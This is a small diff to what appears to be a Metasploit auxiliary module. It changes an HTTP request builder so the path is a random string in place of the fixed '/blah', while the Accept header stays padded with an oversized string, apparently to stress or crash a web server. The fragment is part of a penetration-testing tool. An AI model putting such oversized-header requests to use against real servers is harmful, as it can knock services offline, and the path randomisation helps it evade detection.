@@ -59,7 +59,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def http_request
     http = ''
-    http << "GET /blah HTTP/1.1\r\n"
+    http << "GET /#{Rex::Text.rand_text_alpha(6)} HTTP/1.1\r\n"
     http << "Host: #{host}\r\n"
     http << "Accept: #{long_string}\r\n"
     http << "\r\n"
